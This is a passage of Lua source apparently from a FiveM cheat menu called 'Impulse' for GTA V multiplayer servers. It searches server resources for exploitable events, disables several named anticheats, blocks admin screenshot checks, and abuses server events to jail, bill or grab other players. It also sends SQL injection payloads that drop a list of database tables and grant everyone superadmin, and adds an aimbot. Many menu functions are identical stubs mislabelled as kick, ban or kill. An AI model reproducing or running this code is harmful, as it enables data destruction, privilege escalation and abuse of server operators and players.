                    self.Counter[k] = {buttons = self.Counter[k].buttons + 1, checkbox = self.Counter[k].checkbox,slides = self.Counter[k].slides}
                elseif vv.type == "Slide" then
                        self.Counter[k] = {buttons = self.Counter[k].buttons, checkbox = self.Counter[k].checkbox,slides = self.Counter[k].slides + 1}
                elseif vv.type == "CheckBox" then
                    self.Counter[k] = {buttons = self.Counter[k].buttons, checkbox = self.Counter[k].checkbox + 1,slides = self.Counter[k].slides}
                end
            end
        end
    end
    function Impulse:UpdatePlayerList()
        local temp_table = {}
        local was_checked = self.Categories["ONLINE OPTIONS"].Buttons[1].isChecked
        table.insert(temp_table,{name = "ALL PLAYERS",func = "AllPlayers", type = 'CheckBox', isChecked = was_checked})
        local playerlist = GetActivePlayers()
        for i = 1, #playerlist do
            local KAKA = inTable(self.Categories["ONLINE OPTIONS"].Buttons, playerlist[i])
            if KAKA then
                table.insert(temp_table,{name = GetPlayerName(playerlist[i]).. " - ["..GetPlayerServerId(playerlist[i]).."]",func = playerlist[i], type = 'CheckBox', isChecked =self.Categories["ONLINE OPTIONS"].Buttons[KAKA].isChecked})
            else
                table.insert(temp_table,{name = GetPlayerName(playerlist[i]).. " - ["..GetPlayerServerId(playerlist[i]).."]",func = playerlist[i], type = 'CheckBox', isChecked = false})
            end
        end
        self.Categories["ONLINE OPTIONS"].Buttons = temp_table
    end
    -- functions


    function Impulse:AllPlayers()
        Impulse.Options.AllPlayers = not Impulse.Options.AllPlayers
        if Impulse.Options.AllPlayers then
            local playerlist = GetActivePlayers()
            Impulse.SelectedPlayers = {}
            for i = 1, #playerlist do
                table.insert(Impulse.SelectedPlayers,playerlist[i])
            end
            for k,v in pairs(Impulse.Categories["ONLINE OPTIONS"].Buttons) do
                Impulse.Categories["ONLINE OPTIONS"].Buttons[k].isChecked = true
            end
        else
            Impulse.SelectedPlayers = {}
            for k,v in pairs(Impulse.Categories["ONLINE OPTIONS"].Buttons) do
                Impulse.Categories["ONLINE OPTIONS"].Buttons[k].isChecked = false
            end
        end
    end

    function Impulse.AddPlayerToSelection(player)
        local found = false
        local pos = 0
        for k,v in pairs(Impulse.SelectedPlayers) do
            if v == player then
                found,pos = true,k
            end
        end

        if found then
            table.remove(Impulse.SelectedPlayers,pos)
        else
            table.insert(Impulse.SelectedPlayers,player)
        end
    end

    function Impulse:GetFilesStarted(Code)
        local Regex, RegexTable
        local FinalFoundTable, MergedTables = {}, {}
        RegexTable = {
            "client_scripts% {.-%}",
            "client_scripts%{.-%}",
            "client_scripts% (.-%)",
            "client_scripts%(.-%)",
            "client_script% {.-%}",
            "client_script% '.-%'",
            'client_script% ".-%"',
            "client_script%{.-%}"
        }

        for _ = 1, #RegexTable do
            for i in string.gmatch(Code, RegexTable[_]) do
                table.insert(MergedTables, i)
            end
        end
        if MergedTables ~=  nil then
            for i = 1, #MergedTables do
                Regex = "'.-'"
                for _ in string.gmatch(MergedTables[i], Regex) do
                    local FoundString = string.gsub(_, "'", "")
                    table.insert(FinalFoundTable, FoundString)
                end
                Regex = '".-"'
                for _ in string.gmatch(MergedTables[i], Regex) do
                    local FoundString = string.gsub(_, '"', "")
                    table.insert(FinalFoundTable, FoundString)
                end
            end
        else
            return
        end
    
        if FinalFoundTable ~= nil then
            return FinalFoundTable
        else
            return {}
        end
    end

    function Impulse:RunFileSearcher()
        local clientFiles
        local newClientCode
        local Resources = {}

        for i = 1, GetNumResources() do
            Resources[i] = GetResourceByFindIndex(i)
        end
        self:PushNotification("Searching for triggers...")
        for i = 1, #Resources do
            Wait(200)
            local curres = Resources[i]
            curres = curres:gsub("([^%w])", "%%%1")
            print(curres)
            if curres ~= GetCurrentResourceName() then
                for k, v in pairs({'__resource.lua','fxmanifest.lua'}) do
                    data = LoadResourceFile(curres, v)
                    if data ~= nil then
                        local allFiles = self:GetFilesStarted(data)
                        for k, File in pairs(allFiles) do
                            if File ~= nil then
                                local clientCodes = LoadResourceFile(curres, File)
                                if clientCodes ~= nil then
                                    for kk,vv in pairs(self.DynamicTriggers) do
                                        if clientCodes:find("TriggerServerEvent.'"..vv.trigger.."'") or clientCodes:find('TriggerServerEvent."'..vv.trigger..'"') then
                                            table.insert(self.Categories["TRIGGERS OPTIONS"].Buttons,{name = vv.name,func = vv.func, type = 'Button'})
                                            self:PushNotification("Found trigger : "..vv.trigger.." on "..curres)
                                        end
                                        if clientCodes:find("anticheese") then
                                            TriggerServerEvent("anticheese:SetComponentStatus", "Teleport", false)
                                            TriggerServerEvent("anticheese:SetComponentStatus", "GodMode", false)
                                            TriggerServerEvent("anticheese:SetComponentStatus", "Speedhack", false)
                                            TriggerServerEvent("anticheese:SetComponentStatus", "WeaponBlacklist", false)
                                            TriggerServerEvent("anticheese:SetComponentStatus", "CustomFlag", false)
                                            TriggerServerEvent("anticheese:SetComponentStatus", "Explosions", false)
                                            TriggerServerEvent("anticheese:SetComponentStatus", "CarBlacklist", false)
                                            self:PushNotification("Disabling Anticheese Anticheat")
                                        elseif clientCodes:find("Anticheat:CheckStaffReturn") then
                                            TriggerEvent("Anticheat:CheckStaffReturn", true)
                                            self:PushNotification("Disabling Badger Anticheat")
                                        elseif clientCodes:find("MEBjy6juCnscQrxcDzvs") then
                                            TriggerEvent("MEBjy6juCnscQrxcDzvs")
                                            self:PushNotification("Disabling VB-AC Anticheat")
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end


    function Impulse:BlockScreenShots()
        RegisterNetEvent('screenshot_basic:requestScreenshot')
        AddEventHandler('screenshot_basic:requestScreenshot', function()
            self:PushNotification("Screen capture attempt aborted")
            CancelEvent()
        end)

        RegisterNetEvent('EasyAdmin:CaptureScreenshot')
        AddEventHandler('EasyAdmin:CaptureScreenshot', function()
            self:PushNotification("Screen capture attempt aborted")
            CancelEvent()
        end)

        RegisterNetEvent('requestScreenshot')
        AddEventHandler('requestScreenshot', function()
            self:PushNotification("Screen capture attempt aborted")
            CancelEvent()
        end)

        RegisterNetEvent('__cfx_nui:screenshot_created')
        AddEventHandler('__cfx_nui:screenshot_created', function()
            CancelEvent()
        end)

        RegisterNetEvent('screenshot-basic')
        AddEventHandler('screenshot-basic', function()
            CancelEvent()
        end)

        RegisterNetEvent('requestScreenshotUpload')
        AddEventHandler('requestScreenshotUpload', function()
            self:PushNotification("Screen capture attempt aborted")
            CancelEvent()
        end)

        RegisterNetEvent('EasyAdmin:CaptureScreenshot')
        AddEventHandler('EasyAdmin:CaptureScreenshot', function()
            self:PushNotification("Screen capture attempt aborted")
            TriggerServerEvent("EasyAdmin:TookScreenshot", "ERROR")
            CancelEvent()
        end)
    end

    function Impulse.EnumerateEntities(initFunc, moveFunc, disposeFunc) return coroutine.wrap(function() local iter, id = initFunc() if not id or id == 0 then disposeFunc(iter) return end local enum = {handle = iter, destructor = disposeFunc} setmetatable(enum, entityEnumerator) local next = true repeat coroutine.yield(id) next, id = moveFunc(iter) until not next enum.destructor, enum.handle = nil, nil disposeFunc(iter) end) end
    function Impulse.EnumerateVehicles() return Impulse.EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle) end
    function Impulse.EnumerateObjects() return Impulse.EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject) end
    function Impulse.EnumeratePeds() return Impulse.EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed) end

    function Impulse:TakeAllHostage()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("cmg3_animations:sync", GetPlayerPed(v), "anim@gangops@hostage@", "anim@gangops@hostage@", "perp_idle", "victim_idle", 0.11, 0.24, 0.0, ped, 100000, 0.0, 49, 49, 50, true)
                end
            end
        end)
    end
    function Impulse:CarryAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", v)
                end
            end
        end)
    end
    function Impulse:PiggyBackAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("cmg2_animations:sync", v, "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_a", "piggyback_c_player_b", -0.07, 0.0, 0.0, ped, 100000, 0.0, 49, 33, 1, 1)
                end
            end
        end)
    end
    function Impulse:DestroyDatabase()
        CreateThread(function()
            local sqlTables = {"twitter_accounts", "twitter_likes", "twitter_tweets", "phone_app_chat", "users", "user_accounts", "user_inventory", "society_moneywash", "phone_users_contacts", "characters", "billing", "vehicles", "weashops", "vehicle_categories", "rented_vehicles", "addon_account_data", "addon_inventory_items", "datastore_data", "owned_vehicles", "phone_calls", "phone_messages", "rented_vehicles", "user_licenses", "mysql",'jobs','job_grades','baninfo','banlist',"players"}
            for k, v in pairs(sqlTables) do
                TriggerServerEvent("kashactersS:DeleteCharacter", [['; DROP TABLE `]] .. v .. [[` #]])
                Wait(10)
            end
        end)
    end
    function Impulse:GiveAdminAll()
        CreateThread(function()
            TriggerServerEvent("kashactersS:DeleteCharacter", [['; UPDATE `users` SET `group` = "superadmin" #]])
        end)
    end
    function Impulse:JailAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("esx-qalle-jail:jailPlayer", ped,9999,"Impulse Menu discord.gg/mrWk9DNv7m")
                end
            end
        end)
    end
    function Impulse:ReviveAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("esx_ambulancejob:revive", ped)
                end
            end
        end)
    end
    function Impulse:BillAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("esx_billing:sendBill", ped,"socierty_police","Impulse Menu discord.gg/mrWk9DNv7m",100)
                end
            end
        end)
    end
    function Impulse:ComServAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("esx_communityservice:sendToCommunityService", ped,500000)
                end
            end
        end)
    end
    function Impulse:CrashServer()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:JailAll_2()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:UnjailAll_2()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:JailAll_3()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:UnjailAll_3()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:HandcuffAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:MessageAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:FuckEconomy()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:GiveKeysAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:MakeAnnounce()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:PlaySoundAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:KickAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:BanAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:KillAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:SetAllPolice()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:EmoteAll()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerServerId(v)
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    TriggerServerEvent("CarryPeople:sync", ped)
                end
            end
        end)
    end
    function Impulse:OpenAdminMenu()
        CreateThread(function()
            TriggerEvent("MEBjy6juCnscQrxcDzvs")
            ExecuteCommand('vbacmenu')
        end)
    end
    function Impulse:GiveAllWeapons()
        for k,v in pairs(Impulse.AllWeapons) do
            GiveWeaponToPed(PlayerPedId(), GetHashKey(v), 250, false, false)
        end
    end

    function Impulse.GiveWeaponSlide(weapon)
        GiveWeaponToPed(PlayerPedId(), GetHashKey(weapon), 250, false, true)
    end

    function Impulse:KillAllZombies()
        for ped in Impulse.EnumeratePeds() do
            if not IsPedAPlayer(ped) and ped ~= PlayerPedId() then
                Wait(1)
                if Impulse.RequestControlofVehicle(ped) then
                    SetEntityHealth(ped, 0)
                    SetEntityCoords(ped, GetEntityCoords(PlayerPedId()))
                end
            end
        end
    end

    function Impulse:GiveAllAttachments()
        for k,v in pairs(Impulse.Attachments) do
            if DoesWeaponTakeWeaponComponent(GetSelectedPedWeapon(PlayerPedId()), GetHashKey(v)) then
			    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), GetHashKey(v));
            end
        end
    end

    function Impulse:RemoveAllAttachments()
        for k,v in pairs(Impulse.Attachments) do
            if DoesWeaponTakeWeaponComponent(GetSelectedPedWeapon(PlayerPedId()), GetHashKey(v)) then
			    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), GetHashKey(v));
            end
        end
    end

	function Impulse:GiveWeaponByName()
        local weapon = Impulse.KeyboardInput("Weapon Name:"):lower()
        if not weapon:find("weapon_") then weapon = "weapon_"..weapon end
        GiveWeaponToPed(PlayerPedId(), GetHashKey(weapon), 250, false, true)
    end

    function Impulse:RemoveAllWeapons()
        RemoveAllPedWeapons(PlayerPedId(), 1)
    end

    function Impulse:RefillAll()
        for k,v in pairs(Impulse.AllWeapons) do
            SetPedAmmo(PlayerPedId(), GetHashKey(v), 250)
        end
    end

    function Impulse:VroumVroum()
        Impulse.Options.VroumVroum = not Impulse.Options.VroumVroum
        if Impulse.Options.VroumVroum then
            CreateThread(function()
                while Impulse.Options.VroumVroum do
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    if DoesEntityExist(vehicle) then
                        ModifyVehicleTopSpeed(vehicle, 100.0)
                    end
                    Wait(0)
                end
            end)
        else
            local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
            if DoesEntityExist(vehicle) then
                ModifyVehicleTopSpeed(vehicle, 1.0)
            end
        end
    end

    function Impulse:BetterGrip()
        Impulse.Options.BetterGrip = not Impulse.Options.BetterGrip
        if Impulse.Options.BetterGrip then
            CreateThread(function()
                while Impulse.Options.BetterGrip do
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    if DoesEntityExist(vehicle) then
                        SetVehicleGravityAmount(vehicle, 20.0)
                    end
                    Wait(0)
                end
            end)
        else
            local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
            if DoesEntityExist(vehicle) then
                SetVehicleGravityAmount(vehicle, 10.0)
            end
        end
    end

    function Impulse:LockHead()
        Impulse.Options.LockHead = not Impulse.Options.LockHead
        if Impulse.Options.LockHead then
            CreateThread(function()
                while Impulse.Options.LockHead do
                    DisableControlAction(0,18,1)
                    DisableControlAction(0,69,1)
                    DisableControlAction(0,92,1)
                    DisableControlAction(0,106,1)
                    DisableControlAction(0,122,1)
                    DisableControlAction(0,257,1)
                    DisableControlAction(0,24,1)
                    local _,entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
                    if IsEntityAPed(entity) then
                        local to = GetPedBoneCoords(entity, 31086, 0.0, 0.0, 0.0)
                        if IsDisabledControlPressed(0, 24) and IsPedWeaponReadyToShoot(PlayerPedId()) then
                            SetPedShootsAtCoord(PlayerPedId(), to.x, to.y, to.z, true)
                            Wait(50)
                        end
                    end
                    Wait(0)
                end
            end)
        end -- faire head lock
    end

    function Impulse:Wheelie()
        Impulse.Options.Wheelie = not Impulse.Options.Wheelie
        if Impulse.Options.Wheelie then
            CreateThread(function()
                while Impulse.Options.Wheelie do
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    if DoesEntityExist(vehicle) then
                        SetVehicleWheelieState(vehicle, 129)
                    end
                    Wait(0)
                end
            end)
        else
            local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
            if DoesEntityExist(vehicle) then
                SetVehicleWheelieState(vehicle, 1)
            end
        end
    end

    function Impulse:VehGodMode()
        Impulse.Options.VehGodMode = not Impulse.Options.VehGodMode
        if Impulse.Options.VehGodMode then
            CreateThread(function()
                while Impulse.Options.VehGodMode do
                    Impulse:RepairVehicle()
                    Wait(0)
                end
            end)
        end
    end
    function Impulse:VehTyresGodMode()
        Impulse.Options.VehTyresGodMode = not Impulse.Options.VehTyresGodMode
        if Impulse.Options.VehTyresGodMode then
            CreateThread(function()
                while Impulse.Options.VehTyresGodMode do
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    if DoesEntityExist(vehicle) then
                        SetVehicleTyresCanBurst(vehicle,false)
                    end
                    Wait(0)
                end
            end)
        else
            local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
            if DoesEntityExist(vehicle) then
                SetVehicleTyresCanBurst(vehicle,true)
            end
        end
    end
    function Impulse:VehNoFall()
        Impulse.Options.VehNoFall = not Impulse.Options.VehNoFall
        if Impulse.Options.VehNoFall then
            CreateThread(function()
                while Impulse.Options.VehNoFall do
                    SetPedCanBeKnockedOffVehicle(PlayerPedId(), true) 
                    Wait(0)
                end
            end)
        else
            SetPedCanBeKnockedOffVehicle(PlayerPedId(), false)
        end
    end


    function Impulse:RGBPaint()
        Impulse.Options.RGBPaint = not Impulse.Options.RGBPaint
        if Impulse.Options.RGBPaint then
            CreateThread(function()
                while Impulse.Options.RGBPaint do
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    if DoesEntityExist(vehicle) then
                        for i=0, 159 do 
                            SetVehicleColours(vehicle, i, i)
                            Wait(20)
                        end
                    end
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:VehInvisible()
        Impulse.Options.VehInvisible = not Impulse.Options.VehInvisible
        if Impulse.Options.VehInvisible then
            CreateThread(function()
                while Impulse.Options.VehInvisible do
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    if DoesEntityExist(vehicle) then
                        SetEntityVisible(vehicle, false)
                    end
                    Wait(0)
                end
            end)
        else
            local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
            if DoesEntityExist(vehicle) then
                SetEntityVisible(vehicle, true)
            end
        end
    end

    function Impulse:SpawnVehicleByName()
        local vehicle = Impulse.KeyboardInput("Vehicle Model:")
        if Impulse.RequestModelSync(vehicle) then
            CreateVehicle(GetHashKey(vehicle), GetEntityCoords(PlayerPedId()) , GetEntityHeading(PlayerPedId()) , true, true)
        end
    end

    function Impulse:FullCustom()
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if DoesEntityExist(vehicle) then
            SetVehicleModKit(vehicle, 0)
            SetVehicleMod(vehicle, 14, 0, true)
            SetVehicleNumberPlateTextIndex(vehicle, 5)
            ToggleVehicleMod(vehicle, 18, true)
            SetVehicleColours(vehicle, 0, 0)
            SetVehicleCustomPrimaryColour(vehicle, 0, 0, 0)
            SetVehicleModColor_2(vehicle, 5, 0)
            SetVehicleExtraColours(vehicle, 111, 111)
            SetVehicleWindowTint(vehicle, 2)
            ToggleVehicleMod(vehicle, 22, true)
            SetVehicleMod(vehicle, 23, 11, false)
            SetVehicleMod(vehicle, 24, 11, false)
            SetVehicleWheelType(vehicle, 120)
            SetVehicleWindowTint(vehicle, 3)
            ToggleVehicleMod(vehicle, 20, true)
            SetVehicleTyreSmokeColor(vehicle, Impulse.MenuR,Impulse.MenuG,Impulse.MenuB)
            LowerConvertibleRoof(vehicle, true)
            SetVehicleIsStolen(vehicle, false)
            SetVehicleIsWanted(vehicle, false)
            SetVehicleHasBeenOwnedByPlayer(vehicle, true)
            SetVehicleNeedsToBeHotwired(vehicle, false)
            SetCanResprayVehicle(vehicle, true)
            SetPlayersLastVehicle(vehicle)
            SetVehicleFixed(vehicle)
            SetVehicleDeformationFixed(vehicle)
            SetVehicleTyresCanBurst(vehicle, false)
            SetVehicleWheelsCanBreak(vehicle, false)
            SetVehicleCanBeTargetted(vehicle, false)
            SetVehicleExplodesOnHighExplosionDamage(vehicle, false)
            SetVehicleHasStrongAxles(vehicle, true)
            SetVehicleDirtLevel(vehicle, 0)
            SetVehicleCanBeVisiblyDamaged(vehicle, false)
            IsVehicleDriveable(vehicle, true)
            SetVehicleEngineOn(vehicle, true, true)
            SetVehicleStrong(vehicle, true)
            RollDownWindow(vehicle, 0)
            RollDownWindow(vehicle, 1)
            SetVehicleNeonLightEnabled(vehicle, 0, true)
            SetVehicleNeonLightEnabled(vehicle, 1, true)
            SetVehicleNeonLightEnabled(vehicle, 2, true)
            SetVehicleNeonLightEnabled(vehicle, 3, true)
            SetVehicleNeonLightsColour(vehicle, Impulse.MenuR,Impulse.MenuG,Impulse.MenuB)
            
            SetPedCanBeDraggedOut(PlayerPedId(), false)
            SetPedStayInVehicleWhenJacked(PlayerPedId(), true)
            SetPedRagdollOnCollision(PlayerPedId(), false)
            ResetPedVisibleDamage(PlayerPedId())
            ClearPedDecorations(PlayerPedId())
            SetIgnoreLowPriorityShockingEvents(PlayerPedId(), true)

            SetVehicleMod(vehicle, 11, GetNumVehicleMods(vehicle, 11) - 1, false)
            SetVehicleMod(vehicle, 12, GetNumVehicleMods(vehicle, 12) - 1, false)
            SetVehicleMod(vehicle, 13, GetNumVehicleMods(vehicle, 13) - 1, false)
            SetVehicleMod(vehicle, 15, GetNumVehicleMods(vehicle, 15) - 2, false)
            SetVehicleMod(vehicle, 16, GetNumVehicleMods(vehicle, 16) - 1, false)
            ToggleVehicleMod(vehicle, 17, true)
            ToggleVehicleMod(vehicle, 18, true)
            ToggleVehicleMod(vehicle, 19, true)
            ToggleVehicleMod(vehicle, 21, true)
        end
    end

    function Impulse:RefillFuel()
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if DoesEntityExist(vehicle) then
            SetVehicleFuelLevel(vehicle, 60.0)
        end
    end

    function Impulse:FlipVehicle()
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if DoesEntityExist(vehicle) then
            SetVehicleOnGroundProperly(vehicle)
        end
    end

    function Impulse:DeleteVehicle()
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if DoesEntityExist(vehicle) then
            SetEntityAsMissionEntity(vehicle, false, true)
			DeleteVehicle(vehicle)
        end
    end

    function Impulse:RepairVehicle()
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if DoesEntityExist(vehicle) then
            SetVehicleEngineHealth(vehicle, 1000)
            SetVehicleFixed(vehicle)
            SetVehicleDirtLevel(vehicle,0.0)
            SetVehicleEngineOn(vehicle, 1, 1)
	        SetVehicleBurnout(vehicle, false)
            for i=0, 5 do 
                SetVehicleTyreFixed(vehicle, i)
            end
        end
    end

    function Impulse.vehicleAngle(veh)
        if not veh then return false end
        local vx,vy,vz = table.unpack(GetEntityVelocity(veh))
        local modV = math.sqrt(vx*vx + vy*vy)
        
        local rx,ry,rz = table.unpack(GetEntityRotation(veh,0))
        local sn,cs = -math.sin(math.rad(rz)), math.cos(math.rad(rz))
        
        if GetEntitySpeed(veh)* 3.6 < 5 or GetVehicleCurrentGear(veh) == 0 then return 0,modV end
        
        local cosX = (sn*vx + cs*vy)/modV
        if cosX > 0.966 or cosX < 0 then return 0,modV end
        return math.deg(math.acos(cosX))*0.5, modV
    end

    function Impulse.driftSmoke(base, sub, car, dens, size)
        local all_part = {}
        
        for i = 0,dens do
            UseParticleFxAssetNextCall(base)
            W1 = StartParticleFxLoopedOnEntityBone(sub, car, 0.05, 0, 0, 0, 0, 0, GetEntityBoneIndexByName(car, 'wheel_lr'), size, 0, 0, 0)
    
            UseParticleFxAssetNextCall(base)
            W2 = StartParticleFxLoopedOnEntityBone(sub, car, 0.05, 0, 0, 0, 0, 0, GetEntityBoneIndexByName(car, 'wheel_rr'), size, 0, 0, 0)
    
            table.insert(all_part, 1, W1)
            table.insert(all_part, 2, W2)
        end
        
        Wait(1000)
        
        for _,W1 in pairs(all_part) do
            StopParticleFxLooped(W1, true)
        end
    end

    function Impulse.TeleportAI(type)
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(v)))
                local i = 0
                if type == "Peds" then
                    for peds in Impulse.EnumeratePeds() do
                        i = i + 1
                        SetEntityCoords(peds,x,y,z+i)
                        Wait(100)
                    end
                elseif type == "Vehicles" then
                    for vehs in Impulse.EnumerateVehicles() do
                        i = i + 1
                        SetEntityCoords(vehs,x,y,z+i)
                        Wait(100)
                    end
                elseif type == "Objects" then
                    for objs in Impulse.EnumerateObjects() do
                        i = i + 1
                        SetEntityCoords(objs,x,y,z+i)
                        Wait(100)
                    end
                end
                Wait(100)
            end
        end)
    end

    function Impulse:DriftMode()
        Impulse.Options.DriftMode = not Impulse.Options.DriftMode
        if Impulse.Options.DriftMode then
            CreateThread(function()
                while Impulse.Options.DriftMode do
                    RequestNamedPtfxAsset('scr_recartheft')
                    while not HasNamedPtfxAssetLoaded('scr_recartheft') do
                        Wait(1)
                    end
                    RequestNamedPtfxAsset('core')
                    while not HasNamedPtfxAssetLoaded('core') do
                        Wait(1)
                    end
                    local ang,speed = Impulse.vehicleAngle(GetVehiclePedIsUsing(GetPlayerPed(-1)))
                    local _SIZE = 0.25
                    local _DENS = 25
                    local _BURNOUT_SIZE = 1.5
                    local p_flame_location = {
                        'exhaust',
                        'exhaust_2',
                        'exhaust_3',
                        'exhaust_4',
                        'exhaust_5',
                        'exhaust_6',
                        'exhaust_7',
                        'exhaust_8',
                        'exhaust_9',
                        'exhaust_10',
                        'exhaust_11',
                        'exhaust_12',
                        'exhaust_13',
                        'exhaust_14',
                        'exhaust_15',
                        'exhaust_16',
                    }
                    local p_flame_particle = 'veh_backfire'
                    local p_flame_particle_asset = 'core' 
                    local p_flame_size = 2.0
                    if IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                        if IsVehicleInBurnout(GetVehiclePedIsUsing(GetPlayerPed(-1))) then
                            Impulse.driftSmoke('core', 'exp_grd_bzgas_smoke', GetVehiclePedIsUsing(GetPlayerPed(-1)), 3, 2.0)
                        end

                        local pedVehicle = GetVehiclePedIsIn(GetPlayerPed(-1))
                        local pedPos = GetEntityCoords(GetPlayerPed(-1))
                        local vehiclePos = GetEntityCoords(pedVehicle)
                
                        if GetPedInVehicleSeat(pedVehicle, -1) == GetPlayerPed(-1) then
                            local CarSpeed = GetEntitySpeed(GetVehiclePedIsIn(GetPlayerPed(-1),false) ) * 1.9

